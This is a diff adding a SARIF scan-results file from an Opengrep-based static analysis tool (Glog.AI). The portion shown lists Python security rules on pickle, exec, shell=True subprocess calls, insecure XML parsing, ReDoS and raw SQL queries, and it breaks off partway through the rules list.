@@ -1,0 +1,1364 @@
+{
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Glog.AI",
+          "organization": "Glog.AI",
+          "fullName": "Glog, Making software more secure",
+          "version": "1.0.0",
+          "semanticVersion": "1.0.0",
+          "informationUri": "https://www.glog.ai",
+          "rules": [
+            {
+              "id": "8ed02f3e-4bf1-3a33-94ae-439d5411415a",
+              "name": "resources.rules.python.generic-one-liners",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.generic-one-liners"
+              },
+              "fullDescription": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "note"
+              },
+              "help": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "9d8ac483-fe1b-3ff3-9291-728cb04ea3af",
+              "name": "resources.rules.python.dlint-catastrophic-redos",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.dlint-catastrophic-redos"
+              },
+              "fullDescription": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/](https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/)\n - [https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/](https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "33e5134c-66d8-3a8e-b73f-73bafacbb944",
+              "name": "resources.rules.python.generic-one-liners",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.generic-one-liners"
+              },
+              "fullDescription": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "note"
+              },
+              "help": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "c3e53eb6-70f1-3dd8-bd43-7bfd04bf2834",
+              "name": "resources.rules.python.avoid-pickle",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.avoid-pickle"
+              },
+              "fullDescription": {
+                "text": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities.\nWhen unpickling, the serialized data could be manipulated to run arbitrary code.\nInstead, consider serializing the relevant data as JSON or a similar text-based\nserialization format.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities.\nWhen unpickling, the serialized data could be manipulated to run arbitrary code.\nInstead, consider serializing the relevant data as JSON or a similar text-based\nserialization format.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities.\nWhen unpickling, the serialized data could be manipulated to run arbitrary code.\nInstead, consider serializing the relevant data as JSON or a similar text-based\nserialization format.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.python.org/3/library/pickle.html](https://docs.python.org/3/library/pickle.html)\n - [https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "0c0a706e-8aa5-3e3d-bfbd-df57892e349f",
+              "name": "resources.rules.python.insecure-xml-use",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.insecure-xml-use"
+              },
+              "fullDescription": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Insecure XML parsing functionality, prefer 'defusedxml'\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "f8302d05-340e-300e-bea8-63719dabe88b",
+              "name": "resources.rules.python.dlint-catastrophic-redos",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.dlint-catastrophic-redos"
+              },
+              "fullDescription": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/](https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/)\n - [https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/](https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "b24763e6-3ddd-3bba-8502-239df941ee54",
+              "name": "resources.rules.python.insecure-xml-use",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.insecure-xml-use"
+              },
+              "fullDescription": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Insecure XML parsing functionality, prefer 'defusedxml'\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "0f6a58da-fc89-3441-bf63-0e3616944d81",
+              "name": "resources.rules.python.generic-one-liners",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.generic-one-liners"
+              },
+              "fullDescription": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "note"
+              },
+              "help": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "f6afeea3-174f-325a-bb0b-16ba64b11973",
+              "name": "python.sqlalchemy.security.sqlalchemy-execute-raw-query.sqlalchemy-execute-raw-query",
+              "shortDescription": {
+                "text": "Opengrep Finding: python.sqlalchemy.security.sqlalchemy-execute-raw-query.sqlalchemy-execute-raw-query"
+              },
+              "fullDescription": {
+                "text": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "helpUri": "https://semgrep.dev/r/python.sqlalchemy.security.sqlalchemy-execute-raw-query.sqlalchemy-execute-raw-query",
+              "help": {
+                "text": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/python.sqlalchemy.security.sqlalchemy-execute-raw-query.sqlalchemy-execute-raw-query)\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql)\n - [https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm](https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm)\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "37491dc5-25cc-3c02-8fd9-42ebb7971b86",
+              "name": "resources.rules.python.insecure-pickle-use",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.insecure-pickle-use"
+              },
+              "fullDescription": {
+                "text": "The Python 'pickle' module is not secure against maliciously constructed input"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "The Python 'pickle' module is not secure against maliciously constructed input\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "The Python 'pickle' module is not secure against maliciously constructed input\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "5c230ecf-7b83-33d5-a905-45c0847c9c04",
+              "name": "resources.rules.python.dynamic-urllib-use-detected",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.dynamic-urllib-use-detected"
+              },
+              "fullDescription": {
+                "text": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "5712df5b-8d86-3a3a-8530-50dca0cb6f8b",
+              "name": "resources.rules.python.dlint-catastrophic-redos",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.dlint-catastrophic-redos"
+              },
+              "fullDescription": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/](https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/)\n - [https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/](https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "8172b7eb-bdc6-33a8-86ac-12addbb9d54b",
+              "name": "resources.rules.python.insecure-xml-use",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.insecure-xml-use"
+              },
+              "fullDescription": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Insecure XML parsing functionality, prefer 'defusedxml'\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "94fd16b6-dcba-3658-ad4b-83e46673ac6a",
+              "name": "resources.rules.python.subprocess-shell-true",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.subprocess-shell-true"
+              },
+              "fullDescription": {
+                "text": "Found 'subprocess' function '$FUNC' with 'shell=True'. This is dangerous because this call will spawn\nthe command using a shell process. Doing so propagates current shell settings and variables, which\nmakes it much easier for a malicious actor to execute commands. Use 'shell=False' instead.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Found 'subprocess' function '$FUNC' with 'shell=True'. This is dangerous because this call will spawn\nthe command using a shell process. Doing so propagates current shell settings and variables, which\nmakes it much easier for a malicious actor to execute commands. Use 'shell=False' instead.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Found 'subprocess' function '$FUNC' with 'shell=True'. This is dangerous because this call will spawn\nthe command using a shell process. Doing so propagates current shell settings and variables, which\nmakes it much easier for a malicious actor to execute commands. Use 'shell=False' instead.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://stackoverflow.com/questions/3172470/actual-meaning-of-shell-true-in-subprocess](https://stackoverflow.com/questions/3172470/actual-meaning-of-shell-true-in-subprocess)\n - [https://docs.python.org/3/library/subprocess.html](https://docs.python.org/3/library/subprocess.html)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "f76c137d-b83b-3c9a-a2c5-e30bd8b70d0b",
+              "name": "resources.rules.python.insecure-xml-use",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.insecure-xml-use"
+              },
+              "fullDescription": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Insecure XML parsing functionality, prefer 'defusedxml'\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "6df1271b-061a-3246-9172-27c2bf05d7a9",
+              "name": "resources.rules.python.sqlalchemy-execute-raw-query",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.sqlalchemy-execute-raw-query"
+              },
+              "fullDescription": {
+                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql)\n - [https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm](https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm)\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "082e610a-0d18-3d29-88b3-a43458ace8b0",
+              "name": "resources.rules.python.generic-one-liners",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.generic-one-liners"
+              },
+              "fullDescription": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "note"
+              },
+              "help": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "e6a4e9ae-e0e4-30f3-abb4-f6de8983c783",
+              "name": "resources.rules.python.dynamic-urllib-use-detected",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.dynamic-urllib-use-detected"
+              },
+              "fullDescription": {
+                "text": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "b1988e74-6154-3dac-a2a7-9575f2e23ad1",
+              "name": "resources.rules.python.insecure-exec-use",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.insecure-exec-use"
+              },
+              "fullDescription": {
+                "text": "The Python 'exec' function is not secure against maliciously constructed input"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "The Python 'exec' function is not secure against maliciously constructed input\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "The Python 'exec' function is not secure against maliciously constructed input\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "7c8a9a14-1e4f-3829-bd00-eda0b7b726a1",
+              "name": "resources.rules.python.insecure-xml-use",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.insecure-xml-use"
+              },
+              "fullDescription": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Insecure XML parsing functionality, prefer 'defusedxml'\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Insecure XML parsing functionality, prefer 'defusedxml'\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "256bea54-4dea-3198-b1f3-00a1a6d0cd99",
+              "name": "resources.rules.python.generic-one-liners",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.generic-one-liners"
+              },
+              "fullDescription": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "note"
+              },
+              "help": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "a856baaa-4e9a-35b0-93c5-e8cb2b6837f2",
+              "name": "resources.rules.python.sqlalchemy-execute-raw-query",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.sqlalchemy-execute-raw-query"
+              },
+              "fullDescription": {
+                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql)\n - [https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm](https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm)\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "e64dd979-f00b-3d17-8614-b26acdfe84d5",
+              "name": "resources.rules.python.dlint-catastrophic-redos",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.dlint-catastrophic-redos"
+              },
+              "fullDescription": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/](https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/)\n - [https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/](https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "8d6699e4-220f-3254-a4b7-07a44ce05e8a",
+              "name": "resources.rules.python.generic-one-liners",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.generic-one-liners"
+              },
+              "fullDescription": {
